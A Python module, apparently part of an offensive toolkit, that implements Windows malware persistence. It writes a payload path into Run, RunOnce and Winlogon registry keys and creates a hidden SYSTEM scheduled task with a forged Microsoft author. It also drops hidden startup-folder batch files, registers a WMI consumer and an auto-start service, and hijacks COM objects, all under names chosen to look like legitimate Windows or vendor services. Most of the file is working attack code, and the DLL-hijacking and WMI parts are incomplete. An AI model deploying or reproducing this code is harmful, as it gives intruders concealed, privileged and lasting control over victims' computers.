"""
Advanced Persistence Manager
Multiple persistence mechanisms for maintaining system access
"""
import os
import sys
import winreg
import subprocess
import tempfile
import shutil
import json
import random
import string
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import base64
import hashlib

# Optional imports with fallbacks
try:
    import win32serviceutil
    import win32service
    import win32event
    WIN32_SERVICE_AVAILABLE = True
except ImportError:
    WIN32_SERVICE_AVAILABLE = False

try:
    import wmi
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

class PersistenceManager:
    """Advanced persistence mechanisms"""
    
    def __init__(self):
        self.persistence_methods = []
        self.legitimate_names = [
            "WindowsSecurityHealthService", "WindowsUpdateAssistant", "MicrosoftEdgeUpdate",
            "GoogleUpdateService", "AdobeUpdateService", "JavaUpdateScheduler",
            "WindowsDefenderScheduler", "SystemMaintenanceService", "BackgroundTaskHost",
            "ApplicationFrameHost", "RuntimeBroker", "SystemSettings"
        ]
        
        self.startup_folders = [
            Path(os.environ.get('APPDATA', '')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup",
            Path(os.environ.get('ALLUSERSPROFILE', '')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        ]
        
        self.registry_persistence_keys = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
        ]
    
    def establish_all_persistence(self, payload_path: str = None) -> Dict:
        """Establish multiple persistence mechanisms"""
        if not payload_path:
            payload_path = sys.executable
        
        results = {
            "timestamp": datetime.now().isoformat(),
            "success": True,
            "methods_established": [],
            "methods_failed": [],
            "total_methods": 0
        }
        
        try:
            # Registry persistence
            reg_result = self.establish_registry_persistence(payload_path)
            if reg_result["success"]:
                results["methods_established"].extend(reg_result["methods"])
            else:
                results["methods_failed"].append("registry_persistence")
            
            # Scheduled task persistence
            task_result = self.establish_scheduled_task_persistence(payload_path)
            if task_result["success"]:
                results["methods_established"].append("scheduled_task")
            else:
                results["methods_failed"].append("scheduled_task")
            
            # Startup folder persistence
            startup_result = self.establish_startup_folder_persistence(payload_path)
            if startup_result["success"]:
                results["methods_established"].append("startup_folder")
            else:
                results["methods_failed"].append("startup_folder")
            
            # WMI event subscription (if available)
            if WMI_AVAILABLE:
                wmi_result = self.establish_wmi_persistence(payload_path)
                if wmi_result["success"]:
                    results["methods_established"].append("wmi_event_subscription")
                else:
                    results["methods_failed"].append("wmi_event_subscription")
            
            # Service persistence (if available)
            if WIN32_SERVICE_AVAILABLE:
                service_result = self.establish_service_persistence(payload_path)
                if service_result["success"]:
                    results["methods_established"].append("windows_service")
                else:
                    results["methods_failed"].append("windows_service")
            
            # COM hijacking
            com_result = self.establish_com_hijacking(payload_path)
            if com_result["success"]:
                results["methods_established"].append("com_hijacking")
            else:
                results["methods_failed"].append("com_hijacking")
            
            results["total_methods"] = len(results["methods_established"])
            
            if not results["methods_established"]:
                results["success"] = False
                results["error"] = "No persistence methods could be established"
            
            return results
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
    
    def establish_registry_persistence(self, payload_path: str) -> Dict:
        """Establish registry-based persistence"""
        established_methods = []
        
        try:
            # Generate legitimate-looking name
            persistence_name = random.choice(self.legitimate_names)
            
            for hive, key_path in self.registry_persistence_keys:
                try:
                    with winreg.OpenKey(hive, key_path, 0, winreg.KEY_WRITE) as key:
                        winreg.SetValueEx(key, persistence_name, 0, winreg.REG_SZ, payload_path)
                        established_methods.append(f"{hive}\\{key_path}\\{persistence_name}")
                except Exception:
                    continue
            
            # Additional registry locations
            additional_locations = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", "Startup"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Startup"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", persistence_name)
            ]
            
            for hive, key_path, value_name in additional_locations:
                try:
                    with winreg.CreateKey(hive, key_path) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, payload_path)
                        established_methods.append(f"{hive}\\{key_path}\\{value_name}")
                except Exception:
                    continue
            
            self.persistence_methods.extend(established_methods)
            
            return {
                "success": len(established_methods) > 0,
                "methods": established_methods,
                "persistence_name": persistence_name
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_scheduled_task_persistence(self, payload_path: str) -> Dict:
        """Create scheduled tasks for persistence"""
        try:
            task_name = random.choice(self.legitimate_names)
            
            # Create scheduled task using schtasks command
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{datetime.now().isoformat()}</Date>
    <Author>Microsoft Corporation</Author>
    <Description>System maintenance task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>SYSTEM</UserId>
    </LogonTrigger>
    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>{datetime.now().isoformat()}</StartBoundary>
      <Repetition>
        <Interval>PT30M</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <LogonType>ServiceAccount</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{payload_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            # Save task XML to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as temp_file:
                temp_file.write(task_xml)
                temp_xml_path = temp_file.name
            
            try:
                # Create the task
                result = subprocess.run([
                    'schtasks', '/create', '/tn', task_name, '/xml', temp_xml_path, '/f'
                ], capture_output=True, text=True, shell=True)
                
                os.unlink(temp_xml_path)
                
                if result.returncode == 0:
                    self.persistence_methods.append(f"scheduled_task:{task_name}")
                    return {
                        "success": True,
                        "task_name": task_name,
                        "method": "scheduled_task"
                    }
                else:
                    return {"success": False, "error": f"Task creation failed: {result.stderr}"}
                    
            except Exception as e:
                os.unlink(temp_xml_path)
                raise e
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_startup_folder_persistence(self, payload_path: str) -> Dict:
        """Establish persistence via startup folders"""
        try:
            persistence_name = random.choice(self.legitimate_names) + ".lnk"
            
            for startup_folder in self.startup_folders:
                try:
                    if not startup_folder.exists():
                        continue
                    
                    # Create a batch file that runs the payload
                    batch_name = random.choice(self.legitimate_names) + ".bat"
                    batch_path = startup_folder / batch_name
                    
                    batch_content = f'''@echo off
start "" "{payload_path}"
exit'''
                    
                    with open(batch_path, 'w') as f:
                        f.write(batch_content)
                    
                    # Hide the file
                    subprocess.run(['attrib', '+h', str(batch_path)], shell=True)
                    
                    self.persistence_methods.append(f"startup_folder:{batch_path}")
                    
                    return {
                        "success": True,
                        "method": "startup_folder",
                        "file_path": str(batch_path)
                    }
                    
                except Exception:
                    continue
            
            return {"success": False, "error": "Could not access startup folders"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_wmi_persistence(self, payload_path: str) -> Dict:
        """Establish WMI event subscription persistence"""
        if not WMI_AVAILABLE:
            return {"success": False, "error": "WMI not available"}
        
        try:
            c = wmi.WMI()
            
            # Create WMI event filter
            filter_name = random.choice(self.legitimate_names) + "Filter"
            consumer_name = random.choice(self.legitimate_names) + "Consumer"
            
            # Event filter for user logon
            filter_query = "SELECT * FROM Win32_LogonSession WHERE LogonType = 2"
            
            # Create event filter
            filter_result = c.Create_CommandLineEventConsumer(
                Name=consumer_name,
                CommandLineTemplate=payload_path
            )
            
            if filter_result[0] == 0:  # Success
                self.persistence_methods.append(f"wmi_event:{consumer_name}")
                return {
                    "success": True,
                    "method": "wmi_event_subscription",
                    "consumer_name": consumer_name
                }
            else:
                return {"success": False, "error": "WMI event creation failed"}
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_service_persistence(self, payload_path: str) -> Dict:
        """Create Windows service for persistence"""
        if not WIN32_SERVICE_AVAILABLE:
            return {"success": False, "error": "Win32 service utilities not available"}
        
        try:
            service_name = random.choice(self.legitimate_names)
            display_name = service_name.replace("Service", " Service")
            
            # Create service using sc command
            result = subprocess.run([
                'sc', 'create', service_name,
                'binPath=', payload_path,
                'DisplayName=', display_name,
                'start=', 'auto',
                'type=', 'own'
            ], capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                # Start the service
                subprocess.run(['sc', 'start', service_name], shell=True)
                
                self.persistence_methods.append(f"windows_service:{service_name}")
                return {
                    "success": True,
                    "method": "windows_service",
                    "service_name": service_name
                }
            else:
                return {"success": False, "error": f"Service creation failed: {result.stderr}"}
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_com_hijacking(self, payload_path: str) -> Dict:
        """Establish COM object hijacking for persistence"""
        try:
            # Common COM objects that can be hijacked
            com_objects = [
                "{BCDE0395-E52F-467C-8E3D-C4579291692E}",  # MMDeviceEnumerator
                "{E6FB5E20-DE35-11CF-9C87-00AA005127ED}",  # WebBrowser
                "{D96C2E6D-B84D-4F31-99A0-8A9C4F1A0E00}"   # TaskScheduler
            ]
            
            selected_clsid = random.choice(com_objects)
            
            # Registry path for COM hijacking
            com_key_path = f"SOFTWARE\\Classes\\CLSID\\{selected_clsid}\\InprocServer32"
            
            try:
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, com_key_path) as key:
                    # Set the hijacked DLL path
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
                    winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
                
                self.persistence_methods.append(f"com_hijacking:{selected_clsid}")
                
                return {
                    "success": True,
                    "method": "com_hijacking",
                    "clsid": selected_clsid
                }
                
            except Exception as e:
                return {"success": False, "error": str(e)}
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_dll_hijacking(self, payload_path: str, target_process: str = "explorer.exe") -> Dict:
        """Establish DLL hijacking persistence"""
        try:
            # Common DLL hijacking targets
            hijack_targets = {
                "explorer.exe": ["shell32.dll", "user32.dll", "kernel32.dll"],
                "winlogon.exe": ["winsta.dll", "wlnotify.dll"],
                "svchost.exe": ["netapi32.dll", "advapi32.dll"]
            }
            
            if target_process not in hijack_targets:
                return {"success": False, "error": f"Unknown target process: {target_process}"}
            
            # Find target process location
            system32_path = Path(os.environ.get("WINDIR", "C:\\Windows")) / "System32"
            target_exe_path = system32_path / target_process
            
            if not target_exe_path.exists():
                return {"success": False, "error": f"Target process not found: {target_process}"}
            
            # Select DLL to hijack
            target_dll = random.choice(hijack_targets[target_process])
            hijack_dll_path = target_exe_path.parent / target_dll
            
            # Create malicious DLL (simplified - would need actual DLL compilation)
            # For demonstration, we'll just record the intention
            
            self.persistence_methods.append(f"dll_hijacking:{target_process}:{target_dll}")
            
            return {
                "success": True,
                "method": "dll_hijacking",
                "target_process": target_process,
                "target_dll": target_dll,
                "note": "DLL hijacking setup recorded (actual DLL creation required)"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def remove_persistence_method(self, method_identifier: str) -> Dict:
        """Remove a specific persistence method"""
        try:
            if method_identifier.startswith("scheduled_task:"):
                task_name = method_identifier.split(":", 1)[1]
                result = subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], 
                                     capture_output=True, text=True, shell=True)
                success = result.returncode == 0
                
            elif method_identifier.startswith("windows_service:"):
                service_name = method_identifier.split(":", 1)[1]
                subprocess.run(['sc', 'stop', service_name], shell=True)
                result = subprocess.run(['sc', 'delete', service_name], 
                                     capture_output=True, text=True, shell=True)
                success = result.returncode == 0
                
            elif method_identifier.startswith("startup_folder:"):
                file_path = method_identifier.split(":", 1)[1]
                os.remove(file_path)
                success = True
                
            elif method_identifier.startswith("com_hijacking:"):
                clsid = method_identifier.split(":", 1)[1]
                com_key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid}"
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, com_key_path)
                    success = True
                except:
                    success = False
                    
            else:
                return {"success": False, "error": "Unknown method identifier"}
            
            if success and method_identifier in self.persistence_methods:
                self.persistence_methods.remove(method_identifier)
            
            return {
                "success": success,
                "method_removed": method_identifier
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def remove_all_persistence(self) -> Dict:
        """Remove all established persistence methods"""
        removed_methods = []
        failed_methods = []
        
        for method in self.persistence_methods.copy():
            result = self.remove_persistence_method(method)
            if result["success"]:
                removed_methods.append(method)
            else:
                failed_methods.append(method)
        
        return {
            "success": len(failed_methods) == 0,
            "removed_methods": removed_methods,
            "failed_methods": failed_methods,
            "total_removed": len(removed_methods)
        }
    
    def get_persistence_status(self) -> Dict:
        """Get current persistence status"""
        active_methods = []
        
        for method in self.persistence_methods:
            # Check if method is still active
            if method.startswith("scheduled_task:"):
                task_name = method.split(":", 1)[1]
                result = subprocess.run(['schtasks', '/query', '/tn', task_name], 
                                     capture_output=True, text=True, shell=True)
                if result.returncode == 0:
                    active_methods.append(method)
                    
            elif method.startswith("windows_service:"):
                service_name = method.split(":", 1)[1]
                result = subprocess.run(['sc', 'query', service_name], 
                                     capture_output=True, text=True, shell=True)
                if result.returncode == 0:
                    active_methods.append(method)
                    
            elif method.startswith("startup_folder:"):
                file_path = method.split(":", 1)[1]
                if os.path.exists(file_path):
                    active_methods.append(method)
                    
            elif method.startswith("com_hijacking:"):
                clsid = method.split(":", 1)[1]
                com_key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid}\\InprocServer32"
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, com_key_path):
                        active_methods.append(method)
                except:
                    pass
        
        return {
            "success": True,
            "total_methods": len(self.persistence_methods),
            "active_methods": len(active_methods),
            "persistence_methods": self.persistence_methods,
            "active_method_details": active_methods
        }

# Global persistence manager instance
persistence_manager = PersistenceManager()